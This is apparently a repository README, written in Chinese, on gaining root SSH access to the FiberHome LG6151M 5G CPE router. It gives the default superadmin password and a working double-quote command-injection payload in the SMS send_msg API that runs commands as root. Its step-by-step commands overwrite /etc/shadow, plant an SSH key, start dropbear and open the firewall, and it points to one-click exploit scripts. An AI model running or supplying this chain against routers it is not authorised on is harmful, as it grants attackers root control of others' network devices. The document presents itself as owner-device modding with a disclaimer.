# 烽火 Pro2 代 5G CPE 获取 SSH 教程

> **适用型号**：烽火 LG6151M（Pro2 代）5G CPE
> **系统**：OpenWrt 23.05.0（Linux 5.15.134, aarch64）
> **参考**：本文基于 [Codming 的 LG6121F 研究](https://codming.com/posts/fiberhome-lg6121f-5g-cpe-research/) 实际适配验证

## ⚠️ 免责声明

本教程仅供**教育目的**和**已授权设备**使用。请仅在你拥有所有权或已获得明确书面许可的网络和设备上操作。因滥用本教程造成的任何后果由使用者自负。

## 前置条件

- 已连接到路由器管理网络（默认 `192.168.66.1`）
- 知道超级管理员密码（默认 `F1ber$dm`，铭牌上是普通 admin 密码）
- Windows / macOS / Linux 任一系统

## 与 LG6121F 一代的关键差异

| 项目 | LG6121F（文章） | Pro2 / LG6151M（本文实测） |
|------|----------------|---------------------------|
| API 路径 | `/api/` | **`/fh_api/`** |
| AT 命令注入 | `AT\|id` 管道可用 | **不可用**（`$()` 不过 shell） |
| 短信注入 | `send_msg` content 反引号 | **双引号注入可用** ✅ |
| 系统 | OpenWrt 19.07.7 / musl | OpenWrt 23.05.0 / musl |
| WAF | 无 | **有 WAF**，拦截大部分 API |
| 文件系统 | squashfs 只读 | squashfs 只读（`/tmp`、`/data` 可写） |
| dropbear | 支持 `-A` | **v2022.82 不支持 `-A`** |

## 攻击链总览

```mermaid
graph LR
    A["Web 登录<br/>superadmin / F1ber$dm"] --> B["send_msg 短信接口<br/>content 双引号注入"]
    B --> C["x\";COMMAND;echo \"<br/>→ ROOT RCE（带输出回显）"]
    C --> D["bind mount /etc/shadow<br/>设置 SSH 密码 root123"]
    C --> E["bind mount /root → /data<br/>配置 authorized_keys"]
    C --> F["启动 dropbear<br/>放行防火墙 22 端口"]
    F --> G["ssh root@192.168.66.1"]
```

## 详细步骤

### 步骤 0：确认 Web 管理接口

```powershell
curl http://192.168.66.1/fh_api/tmp/FHNCAPIS?ajaxmethod=get_refresh_sessionid
# 应返回 {"sessionid":"..."}
```

> ⚠️ Pro2 的 API 前缀是 **`/fh_api/`**，不是文章中的 `/api/`。

### 步骤 1：Web 登录（获取 API 调用能力）

Pro2 的 `$post` 函数会自动处理 AES 加密（key = sessionid 前 16 字节，IV = `0x70..0x7f`）。最简单的方式是用无头浏览器调用页面自身的 JS：

用 Chrome DevTools Protocol（`--remote-debugging-pipe`）加载登录页后执行：

```javascript
$post('DO_WEB_LOGIN', {username: 'superadmin', password: 'F1ber$dm'})
// → {"result":0,"user":3}  (0=成功, 3=superadmin)
```

### 步骤 2：短信双引号注入获取 ROOT

这是 Pro2 上**唯一可靠**的命令执行入口。`send_msg` 的 `content` 参数在后端被双引号包裹：

```shell
mn_send_pdu '10000' 'GSM_8BIT' "CONTENT"
```

注入 payload（在 `content` 中闭合双引号）：

```
x";COMMAND;echo "
```

实际执行的 shell 命令：

```shell
mn_send_pdu '10000' 'GSM_8BIT' "x";COMMAND;echo ""
```

**验证注入有效：**

```javascript
$post("send_msg", {
    recv_number: "10000",
    encode_schema: "GSM_8BIT",
    content: 'x";id;echo "'
})
// → {"result":"3\nuid=0(root) gid=0(root)\n"}  ← ROOT 确认
```

输出结构：`3\n` 是短信发送结果，后面是**命令回显**。

### 步骤 3：设置 SSH 密码

Pro2 根文件系统是 squashfs 只读，用 bind mount 覆盖 `/etc/shadow`：

```javascript
// 1. 生成 MD5 密码 hash（musl libc 支持 $1$ 格式）
//    注意：hash 中的 $ 必须用单引号保护，否则被 shell 展开！
'x";printf \'root:%s:18673:0:99999:7:::\\n\' \'$1$ab$Wi/974lO6VjwDTjC3WY1o1\' > /tmp/shadow_new;echo "'
// hash 是 root123 的 MD5 crypt，salt=ab

// 2. bind mount
'x";umount /etc/shadow 2>/dev/null; mount --bind /tmp/shadow_new /etc/shadow;echo "'
```

### 步骤 4：让 /root 可写（配置密钥登录）

`/root` 在只读 squashfs 上，无法创建 `.ssh` 目录。方案：bind mount 到 `/data`：

```javascript
'x";mkdir -p /data/root_home/.ssh;echo "'

// 写入公钥（printf 单引号保护，末尾必须有换行符 \n！）
'x";printf \'%s\\n\' \'ssh-ed25519 AAAA... 你的公钥\' > /data/root_home/.ssh/authorized_keys;echo "'

'x";chmod 700 /data/root_home/.ssh;chmod 600 /data/root_home/.ssh/authorized_keys;echo "'

'x";umount /root 2>/dev/null; mount --bind /data/root_home /root;echo "'
```

> ⚠️ `authorized_keys` **必须以换行符结尾**，否则 dropbear 拒绝该密钥。

### 步骤 5：启用 root SSH 登录

dropbear 配置默认禁止 root 登录：

```javascript
// 修改 /etc/config/dropbear 里的 RootLogin '0' → '1'
// 注意 /etc 是只读的，sed 会失败；dropbear 实际看的是启动参数，
// 直接用命令行启动即可绕过
```

启动 dropbear（v2022.82 **没有 `-A` 参数**）：

```javascript
// 生成 host key（如果 /tmp/dkey 不存在）
'x";dropbearkey -t rsa -f /tmp/dkey 2>/dev/null;echo "'

// 启动（用 bind mount 后的 /root/.ssh/authorized_keys 做密钥认证）
'x";kill $(pidof dropbear) 2>/dev/null;dropbear -p 22 -r /tmp/dkey;sleep 0.3;pidof dropbear;echo "'

// 放行防火墙
'x";iptables -C INPUT -p tcp --dport 22 -j ACCEPT 2>/dev/null || iptables -I INPUT 1 -p tcp --dport 22 -j ACCEPT;echo "'
```

### 步骤 6：登录

```powershell
ssh root@192.168.66.1
# 密码: root123
```

或用密钥：

```powershell
ssh -i router_key root@192.168.66.1
```

Windows 下密码自动填充（避免 SSH 交互弹窗）：

```powershell
# 创建 askpass.bat（内容: @echo root123）
$env:SSH_ASKPASS = ".\askpass.bat"
$env:SSH_ASKPASS_REQUIRE = "force"
$env:DISPLAY = "localhost:0"
ssh root@192.168.66.1
```

## 一键脚本

见本仓库 [`scripts/`](scripts/) 目录：

| 脚本 | 用途 |
|------|------|
| `cdp_login.js` | 通过 Chrome CDP 无头登录 Web 管理 |
| `exploit_sms.js` | 短信双引号注入执行任意命令 |
| `enable_ssh.js` | 完整 SSH 开通流程 |

## 已知问题与坑

1. **WAF 拦截**：Pro2 的 nginx WAF 只放行 `get_refresh_sessionid`，其余 API 直接 403。`send_msg` 只能通过 `$post`（页面 JS）调用，不能裸 curl。
2. **`$()` 在 AT 接口不生效**：Pro2 的 `set_at_command` 不走 shell 解释，`AT$(id)` 返回 `CME ERROR: 4` 而非命令输出。
3. **`base64` 命令不存在**：BusyBox 未安装 base64，写文件请用 `printf '%s\n' '...'`。
4. **hash 的 `$` 转义**：写 shadow 时必须单引号保护 `$1$...`，否则 `$1`、`$ab` 被当成 shell 变量展开成空。
5. **重启失效**：bind mount、dropbear 进程、iptables 规则重启后全部丢失，需要重新执行（或写持久化自启脚本）。

## 持久化（进阶，有变砖风险）

需要修改固件激活 OpenWrt overlayfs。参考原文章的 A/B 分区方案：
- 解锁 MTD 写保护（`ioctl 0x40085318`）
- 修改 `80_mount_root` 取消 `mount_root` 注释
- 重打包 squashfs 并写入备用槽位

**此操作有变砖风险，务必备份原固件。** 本仓库暂未包含脚本。

## 致谢

- [Codming - 烽火 LG6121F 5G CPE 安全研究](https://codming.com/posts/fiberhome-lg6121f-5g-cpe-research/)
- [Acwifi 拆机测评](https://www.acwifi.net/17162.html)
